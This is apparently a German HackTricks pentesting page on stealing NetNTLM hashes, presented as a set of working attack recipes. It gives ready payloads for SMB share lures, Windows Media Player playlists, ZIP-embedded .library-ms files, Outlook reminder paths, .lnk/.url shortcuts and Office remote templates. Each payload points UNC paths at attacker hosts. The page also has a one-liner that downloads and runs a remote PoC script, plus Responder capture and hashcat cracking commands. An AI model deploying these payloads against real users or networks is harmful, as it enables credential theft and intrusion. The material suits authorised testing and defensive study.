# Orte, um NTLM creds zu stehlen

{{#include ../../banners/hacktricks-training.md}}

**Schau dir alle großartigen Ideen an von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — vom Download einer Microsoft Word-Datei online bis zur ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Beschreibbares SMB-Share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du auf ein Share schreiben kannst, das von Benutzern oder geplanten Aufgaben im Explorer durchsucht wird, lege Dateien ab, deren Metadaten auf dein UNC verweisen (z. B. `\\ATTACKER\share`). Das Rendern des Ordners löst eine **implicit SMB authentication** aus und leaks ein **NetNTLMv2** an deinen Listener.

1. **Lures erstellen** (deckt SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. ab)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Lege sie auf der schreibbaren Freigabe ab** (jeder Ordner, den das Opfer öffnet):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Abhören und knacken**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kann mehrere Dateien gleichzeitig ansprechen; alles, was der Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), erfordert keinen Klick.

### Windows Media Player Wiedergabelisten (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine von dir kontrollierte Windows Media Player-Wiedergabeliste zu öffnen oder in der Vorschau anzuzeigen, kannst du Net‑NTLMv2 leaken, indem du den Eintrag auf einen UNC path verweist. WMP versucht, die referenzierten Medien über SMB abzurufen und authentifiziert sich implizit.

Beispiel-Payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Sammlungs- und cracking-Ablauf:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### In ZIP eingebetteter .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer behandelt .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Library-Definition auf einen entfernten UNC-Pfad verweist (z. B. \\attacker\share), führt bereits das Durchsuchen/Starten der .library-ms innerhalb des ZIP dazu, dass Explorer den UNC abfragt und NTLM-Authentifizierungsdaten an den Angreifer sendet. Das liefert ein NetNTLMv2, das offline geknackt oder potenziell relayed werden kann.

Minimal .library-ms, das auf einen Angreifer-UNC zeigt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Erstelle die .library-ms Datei mit dem obigen XML (setze deine IP/hostname).
- Zippe sie (unter Windows: Send to → Compressed (zipped) folder) und liefere die ZIP an das Ziel.
- Starte einen NTLM capture listener und warte, bis das Opfer die .library-ms aus dem ZIP öffnet.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in Kalendereinträgen. Wenn diese Eigenschaft auf einen UNC path (z. B. \\attacker\share\alert.wav) zeigte, kontaktierte Outlook das SMB share, wenn die Erinnerung ausgelöst wurde, leaking the user’s Net‑NTLMv2 without any click. Dies wurde am 14. March 2023 gepatcht, ist aber weiterhin hochrelevant für veraltete/unveränderte Flotten und für historische Incident Response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-Seite:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Das Opfer muss lediglich Outlook for Windows laufen haben, wenn die Erinnerung ausgelöst wird.
- Der leak liefert Net‑NTLMv2, geeignet für Offline‑Cracking oder Relay (nicht pass‑the‑hash).


### .LNK/.URL iconbasiert zero‑click NTLM leak (CVE‑2025‑50154 – Umgehung von CVE‑2025‑24054)

Windows Explorer stellt Verknüpfungssymbole automatisch dar. Aktuelle Forschung zeigte, dass selbst nach Microsofts Patch vom April 2025 für UNC‑Icon‑Shortcuts noch immer NTLM‑Authentifizierung ohne Klicks ausgelöst werden konnte, indem das Shortcut‑Ziel auf einem UNC‑Pfad gehostet und das Icon lokal belassen wurde (Patch‑Umgehung zugewiesen CVE‑2025‑50154). Allein das Anzeigen des Ordners veranlasst Explorer, Metadaten vom entfernten Ziel abzurufen und NTLM an den Angreifer‑SMB‑Server zu senden.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Programmverknüpfung payload (.lnk) über PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Liefermöglichkeiten
- Legen Sie die Verknüpfung in eine ZIP und bringen Sie das Opfer dazu, diese zu durchsuchen.
- Platzieren Sie die Verknüpfung auf einer beschreibbaren Freigabe, die das Opfer öffnen wird.
- Kombinieren Sie sie mit anderen Köderdokumenten im gleichen Ordner, sodass Explorer die Elemente in der Vorschau anzeigt.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-Dokumente können auf eine externe Vorlage verweisen. Wenn Sie die angehängte Vorlage auf einen UNC-Pfad setzen, wird beim Öffnen des Dokuments eine Authentifizierung an SMB durchgeführt.

Minimal DOCX relationship changes (inside word/):

1) Bearbeiten Sie word/settings.xml und fügen Sie die angehängte Vorlagenreferenz hinzu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Bearbeite word/_rels/settings.xml.rels und weise rId1337 auf deinen UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Verpacke es wieder als .docx und liefere es aus. Starte deinen SMB capture listener und warte auf das Öffnen.

Für post-capture Ideen zum relaying oder abusing von NTLM, siehe:

{{#ref}}
README.md
{{#endref}}


## Referenzen
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
